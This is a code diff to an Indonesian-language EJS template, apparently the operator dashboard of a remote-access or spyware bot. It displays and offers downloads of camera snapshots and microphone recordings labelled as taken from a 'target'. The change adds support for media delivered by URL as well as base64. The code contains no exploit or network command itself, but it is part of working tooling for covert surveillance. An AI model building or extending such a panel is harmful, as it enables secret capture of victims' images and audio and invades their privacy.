@@ -77,16 +77,18 @@
             <h2 class="text-lg font-semibold text-white border-b border-gray-700 pb-3">Hasil / Lampiran Respons</h2>
 
             <div class="w-full flex justify-center items-center mt-2">
-                <% if (parsedBody.type==='photo_base64' && parsedBody.data) { %>
+                <% if ((parsedBody.type==='photo_base64' || parsedBody.type==='photo_url' ) && parsedBody.data) { %>
                     <div class="relative group">
-                        <img src="data:image/jpeg;base64,<%= parsedBody.data %>" alt="Jepretan Kamera Target"
+                        <img src="<%= parsedBody.type === 'photo_url' ? parsedBody.data : 'data:image/jpeg;base64,' + parsedBody.data %>"
+                            alt="Jepretan Kamera Target"
                             class="max-w-full h-auto max-h-[70vh] rounded-lg shadow-2xl border border-gray-700 transition-transform hover:scale-[1.02]">
                         <div
                             class="absolute bottom-2 right-2 bg-black/60 px-2 py-1 rounded text-xs text-white backdrop-blur-sm shadow">
                             Kamera Bot</div>
                     </div>
 
-                    <% } else if (parsedBody.type==='audio_base64' && parsedBody.data) { %>
+                    <% } else if ((parsedBody.type==='audio_base64' || parsedBody.type==='audio_url' ) &&
+                        parsedBody.data) { %>
                         <div
                             class="w-full max-w-md bg-gray-900 border border-gray-700 p-5 rounded-xl shadow-lg flex flex-col gap-4 items-center">
                             <svg class="w-16 h-16 text-primary mb-2" fill="none" stroke="currentColor"
@@ -97,14 +99,19 @@
                             </svg>
                             <h3 class="text-gray-300 font-medium">Rekaman Mikrofon Target</h3>
                             <audio controls class="w-full">
-                                <source src="data:audio/mp4;base64,<%= parsedBody.data %>" type="audio/mp4">
-                                <source src="data:audio/aac;base64,<%= parsedBody.data %>" type="audio/aac">
-                                <source src="data:audio/3gpp;base64,<%= parsedBody.data %>" type="audio/3gpp">
-                                <source src="data:audio/wav;base64,<%= parsedBody.data %>" type="audio/wav">
-                                <source src="data:audio/mpeg;base64,<%= parsedBody.data %>" type="audio/mpeg">
-                                Browser Anda tidak mendukung elemen audio.
+                                <% if (parsedBody.type==='audio_url' ) { %>
+                                    <source src="<%= parsedBody.data %>" type="audio/mp4">
+                                    <% } else { %>
+                                        <source src="data:audio/mp4;base64,<%= parsedBody.data %>" type="audio/mp4">
+                                        <source src="data:audio/aac;base64,<%= parsedBody.data %>" type="audio/aac">
+                                        <source src="data:audio/3gpp;base64,<%= parsedBody.data %>" type="audio/3gpp">
+                                        <source src="data:audio/wav;base64,<%= parsedBody.data %>" type="audio/wav">
+                                        <source src="data:audio/mpeg;base64,<%= parsedBody.data %>" type="audio/mpeg">
+                                        <% } %>
+                                            Browser Anda tidak mendukung elemen audio.
                             </audio>
-                            <a href="data:audio/3gpp;base64,<%= parsedBody.data %>" download="record_<%= log.id %>.3gp"
+                            <a href="<%= parsedBody.type === 'audio_url' ? parsedBody.data : 'data:audio/3gpp;base64,' + parsedBody.data %>"
+                                download="record_<%= log.id %>.<%= parsedBody.type === 'audio_url' ? 'mp4' : '3gp' %>"
                                 class="mt-2 text-xs text-primary hover:text-indigo-400 underline">Unduh File Audio
                                 Mentah</a>
                         </div>
